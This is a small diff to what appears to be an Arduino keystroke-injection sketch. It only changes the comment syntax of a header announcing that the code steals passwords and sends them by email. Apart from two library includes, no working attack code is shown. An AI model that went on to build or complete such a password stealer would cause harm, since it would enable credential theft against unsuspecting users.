@@ -1,6 +1,6 @@
-REM--------------------------------------------------------------------
-REM -----This code steals the passwords and send that in email---------
-REM by Anishka Shukla--------------------------------------------------
+//--------------------------------------------------------------------
+// -----This code steals the passwords and send that in email---------
+// by Anishka Shukla--------------------------------------------------
 
 #include "Keyboard.h"
 #include "Mouse.h"
